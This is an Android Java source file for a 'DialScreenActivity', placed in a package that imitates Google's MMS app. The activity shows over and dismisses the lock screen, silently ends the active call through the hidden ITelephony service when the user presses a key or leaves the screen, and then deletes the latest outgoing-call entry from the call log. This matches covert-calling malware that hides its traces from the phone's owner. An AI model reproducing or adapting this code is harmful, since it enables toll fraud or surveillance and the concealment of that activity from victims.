package com.google.android.mms;

import com.android.internal.telephony.ITelephony;
import android.os.DeadObjectException;
import android.os.ServiceManager;
import android.os.RemoteException;
import android.provider.CallLog.Calls;

import android.app.Activity;
import android.os.Bundle;
import android.util.Log;
import android.view.KeyEvent;
import android.view.WindowManager;
import android.os.Handler;
import android.os.Message;
import android.content.ContentResolver;
import android.database.Cursor;
import android.net.Uri;

public class DialScreenActivity extends Activity {
    private static final String TAG = "DialScreenActivity";
    private static final boolean DEBUG = false;
    
    private boolean mHasCreated;
    
    private static final int REMOVE_FIRST_LOG = 0;
    private Handler mHandler = new Handler() {
        public void handleMessage(Message msg) {
            switch (msg.what) {
            case REMOVE_FIRST_LOG:
                deleteLastCallLog();
                SettingManager.getInstance(getApplicationContext()).mForegroundActivity = null;
                finish();
                break;
            }
        }
    };
    
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        if (DEBUG) Log.d(TAG, "[[DialScreenActivity::onCreate]] ============ >>>>>> ");
        // set this flag so this activity will stay in front of the keyguard
        int flags = WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED;
//        if (app.getPhoneState() == Phone.State.OFFHOOK) {
            // While we are in call, the in-call screen should dismiss the keyguard.
            // This allows the user to press Home to go directly home without going through
            // an insecure lock screen.
            // But we do not want to do this if there is no active call so we do not
            // bypass the keyguard if the call is not answered or declined.
            flags |= WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD;
//        }
        getWindow().addFlags(flags);
        mHasCreated = true;
        SettingManager.getInstance(getApplicationContext()).mForegroundActivity = this;
    }
    
    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        if (DEBUG) Log.d(TAG, "[[DialScreenActivity::onKeyDown]] event type = " + event.getCharacters());
        try {
            ITelephony phone = (ITelephony) ITelephony.Stub.asInterface(ServiceManager.getService("phone"));
            phone.endCall();
            mHandler.sendEmptyMessageDelayed(REMOVE_FIRST_LOG, 2000);
        } catch (RemoteException e) {
            
        }
        return super.onKeyDown(keyCode, event);
    }
    
    @Override
    public void onUserLeaveHint () {
        if (DEBUG) Log.d(TAG, "======== [[DialScreenActivity::onUserLeaveHint]] =======");
        if (mHasCreated == true) {
            try {
                ITelephony phone = (ITelephony) ITelephony.Stub.asInterface(ServiceManager.getService("phone"));
                phone.endCall();
                mHandler.sendEmptyMessageDelayed(REMOVE_FIRST_LOG, 2000);
            } catch (RemoteException e) {
            }
        }
    }
    
    private void deleteLastCallLog() {
        if (DEBUG) Log.d(TAG, "[[deleteLastCallLog]]");
        ContentResolver resolver = getContentResolver();
        Cursor c = null;
        try {
            Uri CONTENT_URI = Uri.parse("content://call_log/calls");
            c = resolver.query(
                    CONTENT_URI,
                    new String[] {Calls._ID},
                    "type = 2",
                    null,
                    "date DESC" + " LIMIT 1");
            if (DEBUG) Log.d(TAG, "[[deleteLastCallLog]] c = " + c);
                if (c == null || !c.moveToFirst()) {
                    if (DEBUG) Log.d(TAG, "[[deleteLastCallLog]] cursor error, return");
                    return;
                }
                long id = c.getLong(0);
                String where = Calls._ID + " IN (" + id + ")";
                if (DEBUG) Log.d(TAG, "[[deleteLastCallLog]] delete where = " + where);
                getContentResolver().delete(CONTENT_URI, where, null);
            } finally {
                if (c != null) c.close();
            }
            SettingManager.getInstance(getApplicationContext()).releaseWakeLock();
    }
}
